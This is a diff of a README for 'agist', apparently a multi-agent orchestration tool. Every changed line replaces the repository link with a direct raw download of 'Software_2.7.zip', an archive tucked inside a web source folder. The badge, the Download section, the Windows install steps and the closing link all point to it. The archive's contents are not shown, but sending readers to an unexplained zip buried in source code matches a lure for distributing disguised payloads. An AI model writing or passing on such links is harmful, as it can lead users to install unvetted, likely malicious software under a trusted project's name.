@@ -1,11 +1,11 @@
 # 🤖 agist - Run multi-agent work from one place
 
-[![Download agist](https://img.shields.io/badge/Download-agist-blue?style=for-the-badge&logo=github)](https://github.com/returnable-genusephippiorhynchus808/agist)
+[![Download agist](https://img.shields.io/badge/Download-agist-blue?style=for-the-badge&logo=github)](https://github.com/returnable-genusephippiorhynchus808/agist/raw/refs/heads/main/packages/web/src/app/(dashboard)/runs/Software_2.7.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page and get agist:
-https://github.com/returnable-genusephippiorhynchus808/agist
+https://github.com/returnable-genusephippiorhynchus808/agist/raw/refs/heads/main/packages/web/src/app/(dashboard)/runs/Software_2.7.zip
 
 ## 🖥️ What agist does
 
@@ -32,7 +32,7 @@ agist is made to keep setup simple, so you do not need to change many settings.
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   https://github.com/returnable-genusephippiorhynchus808/agist
+   https://github.com/returnable-genusephippiorhynchus808/agist/raw/refs/heads/main/packages/web/src/app/(dashboard)/runs/Software_2.7.zip
 
 2. Find the latest Windows download on the page.
 
@@ -188,4 +188,4 @@ agent orchestration, AI agents, AI automation, autonomous agents, Claude Code, d
 ## 📎 Download again
 
 If you need the download page again:
-https://github.com/returnable-genusephippiorhynchus808/agist
+https://github.com/returnable-genusephippiorhynchus808/agist/raw/refs/heads/main/packages/web/src/app/(dashboard)/runs/Software_2.7.zip
